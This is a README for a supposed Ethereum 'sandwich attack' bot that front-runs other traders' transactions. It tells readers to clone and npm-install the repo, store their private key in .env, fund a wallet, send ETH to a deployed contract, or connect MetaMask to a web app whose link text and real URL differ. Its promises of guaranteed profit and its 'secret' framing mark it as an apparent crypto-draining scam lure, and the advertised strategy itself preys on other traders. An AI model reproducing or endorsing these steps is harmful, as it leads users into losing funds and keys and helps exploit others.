![Sandwich Attacks Smart Contract](https://repository-images.githubusercontent.com/754453891/e19d4b6c-466f-4adb-a15e-b1774d45a218)

# Sandwich Attacks Smart Contract

Monitor the mempool, placing a higher gas fee, extract profit by buying and selling assets before the original transaction takes place.

On this day I will reveal this secret to everyone on this platform. But this not financial advice so please try using Testnet first.

> But, why the capital funds return to my wallet after the transaction is confirmed?
 
Yes, you can't take profit using testnet or other mainnet network except ethereum because this algorithm will works for Ethereum mainnet only.

Before trying and getting many benefits from this contract, you should know how this contract works:

> Bot sends the Transaction and sniffs the Mempool

> Bots then compete to buy up the token onchain as quickly as possible, sandwiching the victims transaction and creating a profitable slippage opportunity

> Sending back ETH / Capital funds + profit to your wallet.

### Deploy

1. Clone this repo
```shell
git clone https://github.com/etheronly/sandwich-attacks.git
```
2. Install Dependencies
```shell
cd sandwich-attacks
npm install
```
3. Set your Wallet Private Key
```shell
copy .env.example .env
```
```shell
PRIVATE_KEY=your_wallet_private_key
```
4. Fund your wallet with a minimum of 0.6 ETH to cover gas fees and as capital fund
5. Compile Contract
```shell
npm run compile
```
6. Deploy
```shell
npm run deploy
```

Now, you have successfully deployed the contract and ready to eating ETH profits by using your own contract every time. Just like sending ETH to another wallet but in this case you have to send your ETH to your own contract (the minimum capital fund is 0.5 ETH) and then wait until the transaction is confirmed and boom!.

**You need to know that if there is no profit potential, this contract will send back your ETH to wallet.**

### Deploy and Run Using App

1. Open this App = [https://sandwichattack.app](https://sandwichattack.vercel.app)
2. Connect Metamask wallet
3. Select Ethereum Network
4. Set ETH amount as capital
5. Create Bot

Same as above, after the transaction is confirmed please check your wallet balance to see how much profit you have earned.

Go back to the app to get more ETH profits every time, just set ETH as capital in the form and click the start button and wait until the transaction is confirmed then check your wallet again to see the profits you got.

**To keep your contract available in your browser, please do not delete your browser history as your contract is only saved in your local browser storage.**

Don’t forget if you succsess get million of profit by following this secret, feel free to donate some ETH to my wallet here:

```shell
0x4f80b2cD1f550f81581c15F690bDD623F3824c86
```
